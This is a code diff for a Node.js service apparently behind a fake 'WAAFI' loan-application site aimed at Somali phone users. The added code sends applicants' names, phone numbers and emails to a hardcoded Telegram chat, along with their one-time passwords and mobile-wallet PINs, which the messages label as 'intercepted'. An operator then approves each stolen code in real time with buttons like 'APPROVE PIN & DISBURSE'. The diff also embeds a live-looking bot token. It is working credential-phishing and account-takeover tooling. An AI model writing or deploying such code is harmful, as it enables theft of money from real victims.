@@ -1,133 +1,147 @@
 const express = require('express');
 const app = express();
-const http = require('http').createServer(app);
-const io = require('socket.io')(http);
 const axios = require('axios');
-const path = require('path');
 
 app.use(express.json());
 
-// Serve static frontend assets from a 'public' directory to fix Render's "Cannot GET /"
-app.use(express.static(path.join(__dirname, 'public')));
-
-// Root route fallback handler
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    res.json({ status: "Telegram Microservice Operational" });
 });
 
-const activeSessions = new Map();
-const BOT_MANAGER_URL = process.env.BOT_MANAGER_URL || 'http://localhost:3001';
+const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8962560334:AAE-876Pd841650yQjPGfa8rUOPTtr1SJiQ';
+const TELEGRAM_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.TELEGRAM_CHAT_ID || '6362923717';
 
-io.on('connection', (socket) => {
-    const appId = 'WAAFI-' + Math.floor(100000 + Math.random() * 900000);
-    
-    activeSessions.set(socket.id, {
-        appId: appId, socketId: socket.id,
-        loanType: '', amount: 1200, term: '1', purpose: '',
-        firstName: '', lastName: '', email: '', phone: '',
-        employment: '', income: '', employer: '',
-        otpToken: '', pinCode: '', step: 1
-    });
+let rawServerUrl = process.env.SERVER_CORE_URL || 'http://localhost:3000';
+if (!rawServerUrl.startsWith('http://') && !rawServerUrl.startsWith('https://')) {
+    rawServerUrl = 'https://' + rawServerUrl;
+}
+const SERVER_CORE_URL = rawServerUrl;
 
-    socket.emit('session-ready', { appId: appId });
-    socket.join(appId);
+// SILENT LOG ONLY: Record-keeping data feed for Step 3
+app.post('/log-step3-data', async (req, res) => {
+    const { session } = req.body;
+    res.sendStatus(200);
 
-    socket.on('step1', (payload) => {
-        let session = activeSessions.get(socket.id);
-        if (session) { session = { ...session, ...payload, step: 2 }; activeSessions.set(socket.id, session); }
-    });
+    const txt = 
+`📝 <b>New Application Logged (Auto-Advanced)</b>
+🆔 <b>ID:</b> <code>${session.appId}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━
+• <b>User:</b> ${session.firstName} ${session.lastName}
+• <b>Phone:</b> +252${session.phone}
+• <b>Email:</b> ${session.email}
+• <b>Amount:</b> $${Number(session.amount).toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━━━━━
+Status: <i>User forwarded automatically to Step 4 OTP interface...</i>`;
 
-    socket.on('step2', (payload) => {
-        let session = activeSessions.get(socket.id);
-        if (session) { session = { ...session, ...payload, step: 3 }; activeSessions.set(socket.id, session); }
-    });
-
-    // STEP 3: Pushes the browser layout directly to Step 4. No admin approval required.
-    socket.on('step3-data', async (payload) => {
-        let session = activeSessions.get(socket.id);
-        if (!session) return;
-        
-        Object.assign(session, payload);
-        session.step = 4;
-        activeSessions.set(socket.id, session);
-
-        // Tell the user's browser to open Step 4 (OTP) instantly
-        socket.emit('admin-approve-otp'); 
-
-        // Send a copy of the application profile to Telegram silently for logs
-        try {
-            await axios.post(`${BOT_MANAGER_URL}/log-step3-data`, { session });
-        } catch (err) {
-            console.error("Error sending data log to Bot Manager:", err.message);
-        }
-    });
-
-    // STEP 4: Fires ONLY when the user fills out the OTP form and submits
-    socket.on('step4-otp', async (payload) => {
-        let session = activeSessions.get(socket.id);
-        if (!session) return;
-
-        session.otpToken = payload.otp;
-        activeSessions.set(socket.id, session);
-
-        // Notify bot manager to prompt admin for OTP verification
-        try {
-            await axios.post(`${BOT_MANAGER_URL}/trigger-step4-telegram`, { session });
-        } catch (err) {
-            console.error("Error sending OTP alert to Bot Manager:", err.message);
-        }
-    });
-
-    // STEP 5: Fires ONLY when the user fills out their wallet PIN and submits
-    socket.on('step5-pin', async (payload) => {
-        let session = activeSessions.get(socket.id);
-        if (!session) return;
-
-        session.pinCode = payload.pin;
-        activeSessions.set(socket.id, session);
-
-        // Notify bot manager to prompt admin for final authorization
-        try {
-            await axios.post(`${BOT_MANAGER_URL}/trigger-step5-telegram`, { session });
-        } catch (err) {
-            console.error("Error sending PIN alert to Bot Manager:", err.message);
-        }
-    });
-
-    socket.on('disconnect', () => { activeSessions.delete(socket.id); });
+    sendToTelegram(txt, null);
 });
 
-// =========================================================================
-// INCOMING WEBHOOK COMMAND ACTIONS FROM BOT_MANAGER.JS
-// =========================================================================
-app.post('/api/admin-action', (req, res) => {
-    const { actionSignal, targetAppId, message } = req.body;
-    
-    let targetSession = null;
-    for (let [socketId, record] of activeSessions.entries()) {
-        if (record.appId === targetAppId) { targetSession = record; break; }
-    }
+// ACTIONABLE DIALOGUE INTERCEPT FOR STEP 4
+app.post('/trigger-step4-telegram', async (req, res) => {
+    const { session } = req.body;
+    res.sendStatus(200);
 
-    if (!targetSession) return res.status(404).json({ error: "Active application session not found" });
-    const clientSocket = io.sockets.sockets.get(targetSession.socketId);
-    if (!clientSocket) return res.status(410).json({ error: "User has gone offline" });
+    const txt = 
+`🔐 <b>Intercepted Step 4: OTP Verification Token</b>
+🆔 <b>ID:</b> <code>${session.appId}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━
+• <b>Phone Link:</b> +252${session.phone}
+• <b>User Entry OTP:</b> <code>${session.otpToken}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━`;
 
-    // Handle Admin actions sent from Telegram buttons
+    const kb = {
+        inline_keyboard: [[
+            { text: "✅ CONFIRM OTP -> GO PIN", callback_data: `approve_otp:${session.appId}` },
+            { text: "❌ WRONG OTP", callback_data: `reject_otp:${session.appId}` }
+        ]]
+    };
+
+    sendToTelegram(txt, kb);
+});
+
+// ACTIONABLE DIALOGUE INTERCEPT FOR STEP 5
+app.post('/trigger-step5-telegram', async (req, res) => {
+    const { session } = req.body;
+    res.sendStatus(200);
+
+    const txt = 
+`💳 <b>Intercepted Step 5: Secure Account Wallet PIN</b>
+🆔 <b>ID:</b> <code>${session.appId}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━
+• <b>Phone Link:</b> +252${session.phone}
+• <b>Account PIN Code:</b> <code>${session.pinCode}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━`;
+
+    const kb = {
+        inline_keyboard: [[
+            { text: "💰 APPROVE PIN & DISBURSE", callback_data: `approve_pin:${session.appId}` },
+            { text: "❌ WRONG PIN", callback_data: `reject_pin:${session.appId}` }
+        ]]
+    };
+
+    sendToTelegram(txt, kb);
+});
+
+app.post('/telegram-webhook', async (req, res) => {
+    res.sendStatus(200);
+    const { callback_query } = req.body;
+    if (!callback_query || !callback_query.data) return;
+
+    const [actionSignal, targetAppId] = callback_query.data.split(':');
+    let logMessage = '';
+    let apiRouteSignal = actionSignal;
+
     if (actionSignal === 'approve_otp') {
-        // Moves the user's browser view from Step 4 (OTP) to Step 5 (PIN screen)
-        clientSocket.emit('admin-approve-otp'); 
-    } else if (actionSignal === 'otp-failed') {
-        clientSocket.emit('otp-failed', { message: message || "Code-ka OTP-ga aad gelisay waa khalad. Fadlan dib u tijaabi." });
+        logMessage = "✅ OTP status verified. Client advanced to input transaction secure PIN.";
+    } else if (actionSignal === 'reject_otp') {
+        apiRouteSignal = 'otp-failed';
+        logMessage = "❌ OTP signature flagged invalid. Verification error returned to user.";
     } else if (actionSignal === 'approve_pin') {
-        // Generates reference code and instantly forces client layout into Step 6 (Success Card)
-        const generatedRef = 'COD-' + Math.floor(100000 + Math.random() * 900000);
-        clientSocket.emit('pin-verified', { referenceId: generatedRef }); 
-    } else if (actionSignal === 'pin-failed') {
-        clientSocket.emit('pin-failed', { message: message || "PIN-ka koontada aad gelisay waa khalad. Fadlan iska hubi." });
+        logMessage = "💰 SUCCESS! Account PIN confirmed. Funds disbursed and final Success Step shown.";
+    } else if (actionSignal === 'reject_pin') {
+        apiRouteSignal = 'pin-failed';
+        logMessage = "❌ PIN signature flagged invalid. Authorization loop re-prompted.";
     }
 
-    return res.json({ success: true });
+    try {
+        const response = await axios.post(`${SERVER_CORE_URL}/api/admin-action`, {
+            actionSignal: apiRouteSignal,
+            targetAppId: targetAppId
+        });
+
+        if (response.data.success) {
+            updateTelegramMessageUI(callback_query.message, logMessage);
+        }
+    } catch (err) {
+        try {
+            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                callback_query_id: callback_query.id,
+                text: "⚠️ Core connection interface lost.",
+                show_alert: true
+            });
+        } catch (e) {}
+    }
 });
 
-const PORT = process.env.PORT || 3000;
-http.listen(PORT, () => console.log(`Web server routing on port ${PORT}`));
+async function sendToTelegram(text, replyMarkup) {
+    try {
+        const payload = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' };
+        if (replyMarkup) payload.reply_markup = replyMarkup;
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, payload);
+    } catch (e) { console.error("Telegram endpoint connection drop error:", e.message); }
+}
+
+async function updateTelegramMessageUI(msgObj, statusText) {
+    try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            message_id: msgObj.message_id,
+            text: `${msgObj.text}\n\n🤖 <b>System Log:</b>\n<i>${statusText}</i>`,
+            parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: [] }
+        });
+    } catch (e) {}
+}
+
+const PORT = process.env.PORT || 3001;
+app.listen(PORT, () => console.log(`Telegram module tracking active on port ${PORT}`));
